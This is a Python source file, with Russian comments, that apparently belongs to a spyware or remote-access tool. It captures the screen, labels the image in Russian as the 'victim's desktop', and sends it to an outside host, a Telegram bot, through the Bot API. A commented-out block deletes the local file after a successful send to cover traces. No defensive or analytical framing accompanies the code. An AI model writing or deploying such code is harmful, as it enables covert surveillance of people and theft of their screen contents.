import datetime

import requests
from PIL import ImageGrab

from core.config import SOCKET_SCREENSHOTS_DIR

from core.config import TELEGRAM_ID, BOT_TOKEN



def capture_screenshot():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d___%H:%M:%S")
    SOCKET_SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
    filename = SOCKET_SCREENSHOTS_DIR / f'screenshot_{timestamp}.png'

    image = ImageGrab.grab()
    image.save(filename)

    if image:
        print(f"Фото сохранено как {filename}")
    else:
        print('Не удалось сделать изображение экрана!')

    return str(filename)

def send_screenshot_via_telegram(image_path):
    bot_token = BOT_TOKEN  # токен вашего бота
    chat_id = TELEGRAM_ID  # ваш чат ID
    url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

    with open(image_path, 'rb') as image_file:
        files = [
            ('photo', image_file)
        ]
        data = [
            ('chat_id', chat_id),
            ('caption', 'Скриншот рабочего стола жертвы:')
        ]

        response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print("Фото успешно отправлено через Telegram.")
            return True  # Возвращаем True при успешной отправке
        else:
            print(f"Не удалось отправить фото. Статус-код: {response.status_code}")
            return False  # Возвращаем False при неудаче




# screenshot = capture_image()
# if screenshot:
#     if send_image_via_telegram(screenshot):
#         try:
#             os.remove(screenshot)  # Удаляем файл после успешной отправки
#             print(f"Фото {screenshot} успешно удалено.")
#         except Exception as e:
#             print(f"Ошибка при удалении файла: {e}")
# else:
#     print('Не удалось отправить изображение')
